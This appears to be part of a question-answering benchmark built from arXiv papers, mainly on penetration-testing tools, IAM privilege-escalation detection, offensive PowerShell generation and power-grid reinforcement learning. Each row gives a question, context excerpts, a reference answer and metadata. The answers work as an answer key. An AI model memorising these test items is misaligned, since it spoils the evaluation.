industry practitioners, occasionally by\nunderground communities [2], and sometimes even by state actors [3]. However, even experienced security\ndevelopers may overlook critical requirements for such applications.\nAn intriguing example is provided\nby Valenza et al. [4], challenging the conventional belief that remote scanning carries negligible risk. Their\nmethodology, which transformed the scanning system into a target for counterattacks, revealed vulnerabilities\nin widely deployed tools, including Metasploit Pro. Overall, the researchers identified weaknesses in 36 out\nof 78 scanning applications.\nThe existing divide between industry and academia in developing EH tools reflects differing goals and\napproaches, highlighting a significant awareness gap. Industry practitioners are often insufficiently informed\nabout the outcomes and insights generated by academic research in this field. Driven by immediate op-\nerational requirements, the industry tends to favour established tools and practices that promptly address\nreal-time threats. However, this emphasis on practical application can result in a lack of awareness regarding\nsignificant academic contributions, such as novel methodologies and solutions for emerging threats or ad-\nvancements in theoretical frameworks. Consequently, research findings may remain underutilised by industry\npractitioners.\nOne way to bridge the gap between industry and academia in developing EH tools is by producing in-depth\nsurvey papers that detail the tools created by both communities. However, existing surveys primarily assess\nEmail addresses: p.modesti@tees.ac.uk (Paolo Modesti), l.golightly@tees.ac.uk (Lewis Golightly),\nb1445121@tees.ac.uk (Louis Holmes), c.opara@tees.ac.uk (Chidimma Opara), m.moscini@tees.ac.uk (Marco Moscini)\nThis is the extended version of the published paper [1] is available at https://doi.org/10.3390/jcp4030021.\narXiv:2407.14255v1  [cs.CR]  19 Jul 2024\nand compare tools used by industry practitioners, with only occasional consideration of research-informed\ntools [5, 6, 7]. This focus overlooks the innovative contributions from the research community.\nAdditionally, the quantity and breadth of tools reviewed by state-of-the-art surveys in EH tools are\nlimited. For instance, the work by Altulaihan et al. [8] covered 15 papers for web application penetration\ntesting, while Yaacoub et al. [6] reviewed 13 tools specifically applied to IoT. This limited scope restricts\nthe comprehensive evaluation of EH tools. Moreover, existing surveys that classify EH methodologies or\nframeworks compare existing frameworks such as PTES or other industry methodologies like the Information\nSystems Security Assessment Framework (ISAF) [9]. However, they do not discuss the specific tools that\nfall under each category. This narrow focus fails to provide a holistic view of the EH tools landscape.\nResearch Contributions\nIn light of these limitations, this paper makes two significant contributions:\n1. Survey of Research-Informed EH Tools: this study surveys 100 research-informed EH tools developed\nin the last decade. It highlights key areas such']","The gap between industry and academia in developing Ethical Hacking tools reflects differing goals and approaches, highlighting a significant awareness gap. Industry practitioners are often insufficiently informed about the outcomes and insights generated by academic research in this field. Driven by immediate operational requirements, the industry tends to favour established tools and practices that promptly address real-time threats. However, this emphasis on practical application can result in a lack of awareness regarding significant academic contributions, such as novel methodologies and solutions for emerging threats or advancements in theoretical frameworks. Consequently, research findings may remain underutilised by industry practitioners.",simple,"[{'Published': '2024-07-19', 'Title': 'Bridging the Gap: A Survey and Classification of Research-Informed Ethical Hacking Tools', 'Authors': 'Paolo Modesti, Lewis Golightly, Louis Holmes, Chidimma Opara, Marco Moscini', 'Summary': ""The majority of Ethical Hacking (EH) tools utilised in penetration testing\nare developed by practitioners within the industry or underground communities.\nSimilarly, academic researchers have also contributed to developing security\ntools. However, there appears to be limited awareness among practitioners of\nacademic contributions in this domain, creating a significant gap between\nindustry and academia's contributions to EH tools. This research paper aims to\nsurvey the current state of EH academic research, primarily focusing on\nresearch-informed security tools. We categorise these tools into process-based\nframeworks (such as PTES and Mitre ATT\\&CK) and knowledge-based frameworks\n(such as CyBOK and ACM CCS). This classification provides a comprehensive\noverview of novel, research-informed tools, considering their functionality and\napplication areas. The analysis covers licensing, release dates, source code\navailability, development activity, and peer review status, providing valuable\ninsights into the current state of research in this field."", 'entry_id': 'http://arxiv.org/abs/2407.14255v1', 'published_first_time': '2024-07-19', 'comment': 'This is the extended version of the paper published in the Journal of\n  Cybersecurity and Privacy, 4, no. 3: pp 410-448, 2024', 'journal_ref': 'Volume 4, Issue 3: pp 410-448, 2024', 'doi': '10.3390/jcp4030021', 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://dx.doi.org/10.3390/jcp4030021', 'http://arxiv.org/abs/2407.14255v1', 'http://arxiv.org/pdf/2407.14255v1']}]",True
What is the significance of TAC being the first interactive greybox penetration testing tool for third-party cloud security services?,"['box variants of TAC,\neach of which employs a different pretraining strategy or query model.\nAs a result, on the synthesized IAM PE task set by IAMVulGen, TAC’s whitebox variant successfully\ndetected all PEs, and significantly outperforms all three state-of-the-art whitebox baselines, showing\nthe outstanding effectiveness of our IAM modeling. In addition, given a query budget of 100,\nTAC identifies 6% to 38% more PEs with 16% to 23% fewer queries on average than all its three\ngreybox variants, demonstrating the superiority of our pretraining based deep RL approach. On\nthe only publicly available task set IAM Vulnerable [1], TAC is able to detect 23 PEs under a query\nbudget of 10, and all 31 PEs with a query budget of 20, which substantially outperforms all three\nwhitebox baselines. Furthermore, TAC successfully detects two real-world PEs with a query budget\nof 60. The contributions of this paper are:\n• Modeling. A comprehensive modeling for IAM configurations is introduced, providing the\nfoundation of IAM PE detection.\n• Approach. TAC is the first interactive greybox penetration testing tool for third-party cloud\nsecurity services to detect PEs due to IAM misconfigurations.\n• Synthetic Data. An IAM PE task generator called IAMVulGen is proposed.\n2\nBACKGROUND\n2.1\nRL Basics\nRL refers to a set of algorithms that aim to learn to make decisions from interactions [57]. An RL\nproblem is usually formulated as a Markov Decision Process (MDP). In MDP, the learner or the\ndecision maker is called the RL agent. The RL agent interacts with the environment which maintains\nits internal state. In each interaction between the RL agent and the environment, the RL agent\nchooses an action to perform; the environment then updates its state based on the action, and\nreturns a reward quantifying the effectiveness of the action.\nIn this paper, we only consider a finite sequence of interactions between the RL agent and the\nenvironment, which are divided into several sub-sequences, namely episodes. Each episode starts\nfrom an initial state and ends with a terminal state. If an episode ends, the state of the environment\nwill be automatically reset to the initial state for the next episode to start. The return refers to the\ncumulative rewards for one episode. The goal of the RL agent is to learn an RL policy for choosing\nan action per interaction that maximizes the expected return.\n2.2\nIAM Basics\n2.2.1\nIAM Configurations. IAM configuration consists of two components: entities and permissions.\nAn entity represents either a subject or a role in an IAM configuration. Subjects (i.e., users, user\ngroups and services) can actively perform actions. Roles are created to represent job functions and\nresponsibilities within an organization. Permissions refer to privileges of performing operations. An\nentity in an IAM configuration can obtain permissions in both direct and indirect ways. Permissions\ncan be directly assigned to users, user groups and roles; permissions assigned to an entity can be\nindirectly assigned to another entity in many ways, depending on the relationship between the\ntwo entities. For example, all permissions assigned to a user group can be indirectly assigned to a\nuser in the user group; all permissions assigned to a role can be indirectly assigned to a user who\nassumes the role (i.e., become a member of the role).\n4\nYang Hu, Wenxi Wang, Sarfraz Khurshid, and Mohit Tiwari\nUser 1\nUser 2\nPerm 1\nPerm 2\nPerm 3\nPermissions\nService 1\nRole 1\nRole 2\nGroup 1\nEntities\n(a) Original configuration.\nUser 1\nUser 2\nPerm 1\nPerm 2\nPerm 3\nPermissions\nService 1\nRole 1\nRole 2\nGroup 1\nEntities\n(b) Modified configuration.\nFig. 1. An illustrative example of a PE due to IAM misconfiguration, derived from a notable real-world incident\nin 2019. Figure (a) shows the original IAM configuration, where the entity-entity and entity-permission\nconnections are highlighted in blue and orange, respectively. Figure (b) shows the modified IAM configuration\nin the PE, where the modification is highlighted in red.\nFigure 1a presents an IAM configuration example as a relational graph. In the example, there\nare six entities with four entity types: one user group Group 1, two users User 1 and User 2, one\nservice Service 1, and two roles Role 1 and Role 2. Besides, there are three permissions: Perm\n1, Per']",The significance of TAC being the first interactive greybox penetration testing tool for third-party cloud security services is that it can detect PEs due to IAM misconfigurations.,simple,"[{'Published': '2024-06-08', 'Title': 'Interactive Greybox Penetration Testing for Cloud Access Control using IAM Modeling and Deep Reinforcement Learning', 'Authors': 'Yang Hu, Wenxi Wang, Sarfraz Khurshid, Mohit Tiwari', 'Summary': 'Identity and Access Management (IAM) is an access control service in cloud\nplatforms. To securely manage cloud resources, customers need to configure IAM\nto specify the access control rules for their cloud organizations. However,\nincorrectly configured IAM can be exploited to cause a security attack such as\nprivilege escalation (PE), leading to severe economic loss. To detect such PEs\ndue to IAM misconfigurations, third-party cloud security services are commonly\nused. The state-of-the-art services apply whitebox penetration testing\ntechniques, which require access to complete IAM configurations. However, the\nconfigurations can contain sensitive information. To prevent the disclosure of\nsuch information, customers need to manually anonymize the configuration.\n  In this paper, we propose a precise greybox penetration testing approach\ncalled TAC for third-party services to detect IAM PEs. To mitigate the dual\nchallenges of labor-intensive anonymization and potentially sensitive\ninformation disclosures, TAC interacts with customers by selectively querying\nonly the essential information needed. Our key insight is that only a small\nfraction of information in the IAM configuration is relevant to the IAM PE\ndetection. We first propose IAM modeling, enabling TAC to detect a broad class\nof IAM PEs based on the partial information collected from queries. To improve\nthe efficiency and applicability of TAC, we aim to minimize interactions with\ncustomers by applying Reinforcement Learning (RL) with Graph Neural Networks\n(GNNs), allowing TAC to learn to make as few queries as possible. Experimental\nresults on both synthetic and real-world tasks show that, compared to\nstate-of-the-art whitebox approaches, TAC detects IAM PEs with competitively\nlow false negative rates, employing a limited number of queries.', 'entry_id': 'http://arxiv.org/abs/2304.14540v5', 'published_first_time': '2023-04-27', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2304.14540v5', 'http://arxiv.org/pdf/2304.14540v5']}]",True
Which 119.2B token GitHub dataset is used to pre-train CodeGen-Multi?,"['\n• CodeGen [17], an autoregressive language model for\nprogram synthesis with an architecture that follows a\nstandard transformer decoder with left-to-right causal\nmasking. The family of CodeGen models is trained in\nvarious sizes, including 350M, 2.7B, 6.1B, and 16.1B,\nand utilizes various datasets. Specifically, we leverage\nCodeGen-Multi, initialized from CodeGen-NL and fur-\nther pre-trained on BigQuery [17], a large-scale dataset\nof multiple programming languages from GitHub repos-\nitories, which consists of 119.2B tokens and includes C,\nC++, Go, Java, JavaScript, and Python.\nIn our experiments, we randomly split the fine-tuning\ndataset into training (the set of examples used to fit the param-\neters), validation (the set used to tune the hyperparameters of\nthe models), and test (the set used for the evaluation of the\nmodels) sets using a typical 80%/10%/10% ratio.\nTo assess the performance of the models in generating\noffensive PowerShell code from NL descriptions, we used\noutput similarity metrics, which compare the generated code\nwith the code from the ground truth. This type of metrics is\nwidely used to assess the performance of AI generators in\nmany code generation tasks [55], including the generation of\ncode for security contexts [28–31,56]. The metrics are:\n• Bilingual Evaluation Understudy (BLEU) score [57].\nIt measures the degree of n-gram overlapping between\nthe string of each code snippet produced by the model\nand the reference, for values of n usually ranging be-\ntween 1 and 4 [58, 59]. We implemented BLEU-4\nscore (i.e., with n = 4) computation employing the\nbleu_score module contained in the open-source Natu-\nral Language Toolkit (NLTK) Python suite [60].\n• Edit Distance (ED). It measures the edit distance be-\ntween two strings, i.e., the minimum number of opera-\ntions on single characters required to make each code\nsnippet produced by the model equal to the reference.\nFor the edit distance, we adopted the Python library\npylcs [61].\n• METEOR [62]. It measures the alignment between each\ncode snippet produced by the model and the reference.\nThe alignment is defined as a mapping between unigrams\n(i.e., 1-gram), such that every unigram in each string\nmaps to zero or one unigram in the other string and no\nunigrams in the same string. To calculate the METEOR\nmetric, we relied on the Python library evaluate by\nHuggingFace [63].\n• ROUGE-L. It is a metric based on the longest common\nsubsequence (LCS) between the model output and the\nreference, i.e., the longest sequence of words (not neces-\nsarily consecutive, but still in order) shared between both.\nWe computed the ROUGE-L metric using the Python\npackage rouge [64].\nAll metrics range between 0 and 1, with higher scores corre-\nsponding to a better quality of the generated code. To evaluate\nthe generated PowerShell code, we also introduce additional\nevaluation metrics based on static and dynamic analysis that\nare specific to our context. These metrics will be introduced\nin the following sections.\n6\n3.4\nResearch Questions\nWe designed this research study to answer the following re-\nsearch questions (RQs):\n▷RQ1: To what extent can NMT models effectively generate\noffensive PowerShell code for security applications from NL\ndescriptions?\nRQ1 aims to establish a preliminary assessment of NMT\nmodels in generating PowerShell code for offensive security\napplications. This investigation seeks to shed light on the\nmodels’ efficacy in translating NL descriptions into offensive\ncode.\n▷RQ2: What is the influence of the training strategies on\nNMT models’ performance in offensive PowerShell code gen-\neration?\nRQ2 focuses on the impact of pre-training and fine-tuning\non the quality of generated code. We analyze the influence\nof these training strategies by considering different configu-\nrations of the NMT models and their impact on their perfor-\nmance.\n▷RQ3: How good is the generated code in terms of code\nquality and dynamic behavior?\nRQ3 aims to evaluate the generated PowerShell code in a\ndeeper way than output similarity metrics, in terms of syntac-\ntic correctness and capability of executing malicious actions\nrealistically, through behavioral comparison with the ground\ntruth.']",The 119.2B token GitHub dataset used to pre-train CodeGen-Multi is BigQuery.,reasoning,"[{'Published': '2024-04-19', 'Title': 'The Power of Words: Generating PowerShell Attacks from Natural Language', 'Authors': 'Pietro Liguori, Christian Marescalco, Roberto Natella, Vittorio Orbinato, Luciano Pianese', 'Summary': 'As the Windows OS stands out as one of the most targeted systems, the\nPowerShell language has become a key tool for malicious actors and\ncybersecurity professionals (e.g., for penetration testing). This work explores\nan uncharted domain in AI code generation by automatically generating offensive\nPowerShell code from natural language descriptions using Neural Machine\nTranslation (NMT). For training and evaluation purposes, we propose two novel\ndatasets with PowerShell code samples, one with manually curated descriptions\nin natural language and another code-only dataset for reinforcing the training.\nWe present an extensive evaluation of state-of-the-art NMT models and analyze\nthe generated code both statically and dynamically. Results indicate that\ntuning NMT using our dataset is effective at generating offensive PowerShell\ncode. Comparative analysis against the most widely used LLM service ChatGPT\nreveals the specialized strengths of our fine-tuned models.', 'entry_id': 'http://arxiv.org/abs/2404.12893v1', 'published_first_time': '2024-04-19', 'comment': '18th USENIX WOOT Conference on Offensive Technologies, GitHub Repo:\n  https://github.com/dessertlab/powershell-offensive-code-generation', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2404.12893v1', 'http://arxiv.org/pdf/2404.12893v1']}]",True
"How do Metasploitable VMs aid vuln detection/exploitation in black-box pentesting, and what's NLPAgent's role?","[' only chatgpt NLPAgent is available.\n• Type of Reporter that will be used. At this time, only docxtpl (Docx Jinja3 framework) Reporter is available.\n• Project to store the results. Exploits found by the Exploiter module, the generated report and other results will\nbe placed in the specified project folder.\n4.2\nTesting PThelper functionality\nTwo simulated pentesting environments were deployed to validate the behaviour of the tool.\n4.2.1\nBlack box infrastructure\nThis is a local networking scenario that includes several Virtual Machines simulating a real pentesting environment.\nThree vulnerable Virtual Machines based on Metasploitable2 [24] and Metasploitable3 [25] were used. These machines\ncontain a wide list of vulnerabilities and are intentionally designed to be vulnerable to help the pentesters develop their\nskills.\nFigure 8 shows the topology of this environment. The pentester only has network visibility of the first host, a Windows\nMetasploitable3 machine (Host A). The other two hosts in the environment are Linux hosts, corresponding to a Linux\nMetasploitable2 (Host B) and a Linux Metasploitable3 (Host C) machine. The idea is to verify if PThelper can be used\nin a black-box environment, this is, using PTHelper to compromise a host, and use the tool with the compromised host\nas pivot with hosts that were not previously accessible. This is a real and typical pentesting scenario.\nPThelper was able to detect a RCE (Remote Code Execution) vulnerability on the first host, apart from a wide list of\nother vulnerabilities. After exploiting the RCE vulnerability (CVE-2014-3120) to compromise Host A, a port forwarding\ntechnique was used to forward all traffic from PTHelper to the hosts that are not in direct network range (Host B and\nHost C) to use the tool against these hosts. PTHelper managed to detect a wide list of vulnerabilities in these two hosts\nand offered a list of exploits, some of which were used to gain DoS (denial of service) and RCE to fully compromise\n10\narXiv Template\nA PREPRINT\nthe infrastructure. The output report generated with the tool after performing this experiment by using the tool against\nthe three hosts is also available2.\nNote that not all the vulnerabilities of these hosts were found in the process, as some of them are web vulnerabilities,\nthat need to be enumerated and exploited using manual means or a specialized web scanner. This was taken into account\nand it will be one of the main improvement points of the tool.\nTable 1 details the execution times in seconds of each of the modules of the tool, in order to detect which parts of the\ntool need more development and optimization for the next versions. The benchmark was executed in a Kali 2023.2\nVirtual Machine, with 4GB of RAM memory and 4 CPU cores, and, therefore, the tool could perform better in an\nenvironment with more resources.\nTable 1: Execution time of PTHelper for each of the hosts (seconds)\nTask\nHost A\nHost B\nHost C\nScanner-Port Discovery\n1.16\n3.10\n3.13\nScanner-Vulnerability Discovery\n147.15\n350.28\n284.39\nScanner - OS Discovery\n0.01\n0.34\n0.2\nExploiter\n56.04\n128.04\n89.04\nNLPAgent - Executive Summary\n158.84\n289.82\n233.34\nNLPAgent - Finding report\n1454.66\n2493.24\n2097.75\nReporter - Render report\n0.1362\n0.1418\n0.1591\nTotal time\n1720.98\n3365.83\n2708.75\nOverall, the most time-consuming part of the Scanner module is the Vulnerability Discovery part where queries to the\nNVD API are performed. For each of these queries, there is a delay when performing and receiving these requests,\nalthough the delay parameter was adjusted to the minimum possible allowed by the API. Due to the amount of\nvulnerabilities per host, this part was time consuming, reaching more than five (5) minutes for the Host B.\nThe Exploiter module had an execution time between one (1) and two (2) minutes. For the NLPAgent module, times are\nsignificantly higher compared to the rest of the modules. Most of the execution time of the tool resides in this module,\nand, specially, in the Finding Report section of the tool. The justification is simple: The tool performs one query to the\nOpenAI API per obtained finding. Taking into account that', ' each of the hosts generated more than 20 findings, and\nthat each finding needs to be processed by the engine, the amount of time spent in this operations is high. Finally, the\nReporter module does not have a great implication in the execution time as the overall execution time is less than one\n(1) second.\nAs the operations of some of the modules depend directly on the found vulnerabilities, the execution time is directly\ncorrelated on how vulnerable the host is.\nA proper update to the NLPAgent module would be to parallelize the requests performed to the OpenAI API, in order to\ngenerate the findings list faster. Also note that the model used was gpt-3.5-turbo-16k. Using gpt-4 model will\nprobably provide better values.\n4.2.2\nHackTheBox machine\nIn this experiment, the tool is tested against a host in the Internet instead of the local network. The targeted host is\na machine from HackTheBox[26]. HackTheBox is a gamified cibersecurity training platform, containing vulnerable\nmachines that can be used to practise hacking skills. A machine of this platform called Blue was used in this experiment.\nThe tool was used against an instance of this machine, specifying some of the most popular ports as a parameter. The\ntool managed to discover the vulnerability of this machine, CVE-2017-0144. After discovering the vulnerability, the\nExploit module returned several exploits to leverage Remote Code Execution and compromise the host using this\nvulnerability. One of the obtained exploits was a Metasploit script, which is the one used in the video demonstration3 to\ncompromise the host and retrieve the flag, finishing the challenge.\nBy performing this experiment, it has been possible to demonstrate that the tool can be used by the pentesters in\nnon-local scenarios and that the exploits that the Exploiter module obtains are usable.\n2https://bit.ly/pthelper-report\n3https://www.youtube.com/watch?v=z7APguceuME\n11\narXiv Template\nA PREPRINT\n5\nConclusion and future work\nA tool to automate the pentesting process and support the pentested has been presented and tested in two different\nscenarios. It is reduces the number of the interactions that the pentester has to perform in the assessments in certain\ntypes of penetration tests, such as infrastructure penetration testing. The modular design of the tool lets functionality to\nbe expanded to cover other needs of the community. This tool is able to cover of the pentesting lifecycle and provide a\ndraft for the integrated report.\nFuture work includes fitting in another pentesting scenarios (such as Web or Mobile application pentesting). Another\ntool improvement, as seen in the experiments section, would be to parallelize some of the operations of the tool, such as\nthe Finding List generation by the NLPAgent. The tool has been developed with one option per module, this is, nmap\nfor the Scanner module, ExploitDB for the Exploiter module, OpenAI API for the NLPAgent module and a Jinja2\nframework with a Docx document for the Reporter module. Additional options will be integrated.\n6\nAcknowledgement\nA. Sánchez-Macián would like to acknowledge the support of the R&D project PID2022-136684OB-C21 (Fun4Date)\nfunded by the Spanish Ministry of Science and Innovation MCIN/AEI/ 10.13039/501100011033.\nReferences\n[1] D. Rogers and V. Kanth, “Wannacry data collection system design and tutorial,” in MILCOM 2021 - 2021 IEEE\nMilitary Communications Conference (MILCOM), 2021, pp. 1–6.\n[2] J. Li, D. Sisodia, and S. Stafford, “On the detection of smart, self-propagating internet worms,” IEEE Transactions\non Dependable and Secure Computing, vol. 20, no. 4, pp. 3051–3063, 2023.\n[3] “Nmap: the network mapper.” [Online]. Available: https://nmap.org/\n[4] “Metasploit, a penetration testing framework.” [Online]. Available: https://www.metasploit.com/\n[5] “Nist - national vulnerability database (nvd).” [Online]. Available: https://nvd.nist.gov/vuln\n[6] “Mitre - common vulnerabilities and exposures (cve).” [Online]. Available: https://www.cve.org/Media/News/\nAllNews\n[7] D. Elsbroek, D.']","Metasploitable VMs aid vulnerability detection and exploitation in black-box pentesting by providing intentionally vulnerable machines that simulate real pentesting environments. These VMs help pentesters develop their skills by allowing them to detect and exploit a wide range of vulnerabilities. In the context of the PTHelper tool, NLPAgent's role is to generate the executive summary and finding report based on the detected vulnerabilities and exploits, although it is noted that this process is time-consuming due to the need to process each finding individually.",multi_context,"[{'Published': '2024-06-12', 'Title': 'PTHelper: An open source tool to support the Penetration Testing process', 'Authors': 'Jacobo Casado de Gracia, Alfonso Sánchez-Macián', 'Summary': 'Offensive security is one of the state of the art measures to protect\nenterprises and organizations. Penetration testing, broadly called pentesting,\nis a branch of offensive security designed to find, rate and exploit these\nvulnerabilities, in order to assess the security posture of an organization.\nThis process is often time-consuming and the quantity of information that\npentesters need to manage might also be difficult to handle. This project takes\na practical approach to solve the automation of pentesting and proposes a\nusable tool, called PTHelper. This open-source tool has been designed in a\nmodular way to be easily upgradable by the pentesting community, and uses state\nof the art tools and artificial intelligence to achieve its objective.', 'entry_id': 'http://arxiv.org/abs/2406.08242v1', 'published_first_time': '2024-06-12', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://arxiv.org/abs/2406.08242v1', 'http://arxiv.org/pdf/2406.08242v1']}, {'Published': '2024-06-12', 'Title': 'PTHelper: An open source tool to support the Penetration Testing process', 'Authors': 'Jacobo Casado de Gracia, Alfonso Sánchez-Macián', 'Summary': 'Offensive security is one of the state of the art measures to protect\nenterprises and organizations. Penetration testing, broadly called pentesting,\nis a branch of offensive security designed to find, rate and exploit these\nvulnerabilities, in order to assess the security posture of an organization.\nThis process is often time-consuming and the quantity of information that\npentesters need to manage might also be difficult to handle. This project takes\na practical approach to solve the automation of pentesting and proposes a\nusable tool, called PTHelper. This open-source tool has been designed in a\nmodular way to be easily upgradable by the pentesting community, and uses state\nof the art tools and artificial intelligence to achieve its objective.', 'entry_id': 'http://arxiv.org/abs/2406.08242v1', 'published_first_time': '2024-06-12', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://arxiv.org/abs/2406.08242v1', 'http://arxiv.org/pdf/2406.08242v1']}]",True
What challenges do adaptive emergency control strategies face in modern power systems with high penetration of renewable energy and electronic equipment?,"['1\nMake Safe Decisions in Power System: Safe\nReinforcement Learning Based Pre-decision Making\nfor Voltage Stability Emergency Control\nCongbo Bi, Student Member, IEEE, Lipeng Zhu, Di Liu, Member, IEEE, and Chao Lu, Senior Member, IEEE\nAbstract—The high penetration of renewable energy and\npower electronic equipment bring significant challenges to the\nefficient construction of adaptive emergency control strate-\ngies against various presumed contingencies in today’s power\nsystems. Traditional model-based emergency control methods\nhave difficulty in adapt well to various complicated operating\nconditions in practice. Fr emerging artificial intelligence-based\napproaches, i.e., reinforcement learning-enabled solutions, they\nare yet to provide solid safety assurances under strict constraints\nin practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-\ndecision making framework against short-term voltage collapse.\nOur proposed framework employs neural networks for pre-\ndecision formulation, security margin estimation, and correc-\ntive action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a\nsecurity projecting correction algorithm that offers theoretical\nsecurity assurances to amend risky actions. The applicability of\nthe algorithm is further enhanced through the incorporation\nof active learning, which expedites the training process and\nimproves security estimation accuracy. Extensive numerical tests\non the New England 39-bus system and the realistic Guangdong\nProvincal Power Grid demonstrate the effectiveness of the\nproposed framework.\nIndex Terms—pre-decision making, safe reinforcement learn-\ning, security margin, power system, short-term stability\nI. INTRODUCTION\nW\nITH the increasing penetration of renewable energy\nsources and electronic equipment into modern power\nsystems, the operating conditions of the power systems are\nmore and more complex and variable, bringing unprecedented\nchallenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies [1].\nConventionally, the widely-used approach to emergency con-\ntrol in practical power systems is implemented in the form of\nformulating formulating a set of control strategies in advance,\nThis work was supported in part by the China Southern Power Grid\nResearch Project ZBKJXM20232029 and the National Natural Science Foun-\ndation of China under Grant 52207094.\nThis work has been submitted to the IEEE for possible publication.\nCopyright may be transferred without notice, after which this version may\nno longer be accessible.\nCongbo Bi is with the Department of Electrical Engineeering, Tsinghua\nUniversity, Beijing, 100084 China (e-mail: thueea bcb@outlook.com).\nLipeng Zhu is with the College of Electrical and Information Engineering,\nHunan University, Hunan, 410082 China (e-mail:zhulpwhu@126.com).\nDi Liu is with the Department of Electrical Engineeering, Tsinghua\nUniversity, Beijing, 100084 China (e-mail: kfliudi@163.com).\nChao Lu is with the Department of Electrical Engineeering, Tsinghua\nUniversity, Beijing, 100084 China (e-mail: luchao@tsinghua.edu.cn).\nand matching them with practical operational scenarios in real-\ntime. This procedure involves the construction of a ‘presumed\nfault set’, necessitating numerous time-consuming simulations\nto derive a suitable table of emergency control strategies [2].\nConsidering the complexity, it is a common practice to focus\non a small number of representative scenarios for strategy\nformulation. As the structural and operational complexity\nof power systems increases, the above-mentioned traditional\napproaches is confronted with challenges of how to effectively\nmanage the remendous presumed operational scenarios within\na limited period of time [3]. Moreover, the intricate dynamic\ncharacteristics of renewable energy sources and power elec-\ntronic devices make it quite difficult to accurately model\nsystem dynamics, thereby undermining the reliability of the\ntraditional approach to emergency control [4]. In this respect,\nit is imperative to swiftly identify high-risk operating statuses\nand formulate suitable emergency control measures.\nDifferent from traditional approaches severely relying on\ndetailed system modeling and simulations, deep reinforcement\nlearning (DRL) methods provide a promising data-driven\nalternative to solve these issues. Specifically, DRL agent can\nlearn from interactions with the environment of the system\nand update its policy without reliance on the knowledge about\ndetailed system models and parameters [5]. There have been\nextensive studies on the formulation of DRL-based emergency\ncontrol strategies [6]–[8], where emergency control is modeled\nas a Markov decision process (MDP) and a DRL agent learns\nopt']","Adaptive emergency control strategies face significant challenges in modern power systems with high penetration of renewable energy and electronic equipment due to the increased complexity and variability of operating conditions. Traditional model-based methods struggle to adapt well to these complicated conditions, and there is a need for efficient construction of control strategies against various presumed contingencies.",simple,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
Which framework uses logic programming to detect hallucinations in LLMs?,"[' Press, W. Merrill, A. Liu, and N. A.\nSmith, “How language model hallucinations can snow-\nball,” arXiv preprint arXiv:2305.13534, 2023.\n[58] N. Li, Y. Li, Y. Liu, L. Shi, K. Wang, and H. Wang, “Hal-\nluvault: A novel logic programming-aided metamorphic\ntesting framework for detecting fact-conflicting halluci-\nnations in large language models,” 2024.\n[59] [Online]. Available: https://www.vulnhub.com/entry/\nhackable-ii,711/\n17\n[60] [Online]. Available: https://redpwn.net/\n[61] [Online].\nAvailable:\nplay.picoctf.org/events/67/\nscoreboards\n[62] Y. Liu, Y. Yao, J.-F. Ton, X. Zhang, R. Guo, H. Cheng,\nY. Klochkov, M. F. Taufiq, and H. Li, “Trustworthy llms:\na survey and guideline for evaluating large language\nmodels’ alignment,” 2023.\n[63] Y. Liu, G. Deng, Z. Xu, Y. Li, Y. Zheng, Y. Zhang,\nL. Zhao, T. Zhang, and Y. Liu, “Jailbreaking chatgpt via\nprompt engineering: An empirical study,” arXiv preprint\narXiv:2305.13860, 2023.\n[64] G. Deng, Y. Liu, Y. Li, K. Wang, Y. Zhang, Z. Li,\nH. Wang, T. Zhang, and Y. Liu, “Masterkey: Automated\njailbreaking of large language model chatbots,” in\nProceedings 2024 Network and Distributed System\nSecurity Symposium, ser. NDSS 2024.\nInternet Society,\n2024. [Online]. Available: http://dx.doi.org/10.14722/\nndss.2024.24188\n[65] Y. Liu, G. Deng, Y. Li, K. Wang, Z. Wang, X. Wang,\nT. Zhang, Y. Liu, H. Wang, Y. Zheng, and Y. Liu,\n“Prompt injection attack against llm-integrated applica-\ntions,” 2024.\n[66] J. Li, Y. Liu, C. Liu, L. Shi, X. Ren, Y. Zheng, Y. Liu, and\nY. Xue, “A cross-language investigation into jailbreak\nattacks in large language models,” 2024.\n[67] G. Deng, Y. Liu, K. Wang, Y. Li, T. Zhang, and Y. Liu,\n“Pandora: Jailbreak gpts by retrieval augmented genera-\ntion poisoning,” 2024.\n[68] H. Li, G. Deng, Y. Liu, K. Wang, Y. Li, T. Zhang, Y. Liu,\nG. Xu, G. Xu, and H. Wang, “Digger: Detecting copy-\nright content mis-usage in large language model train-\ning,” 2024.\n[69] Z. Chang, M. Li, Y. 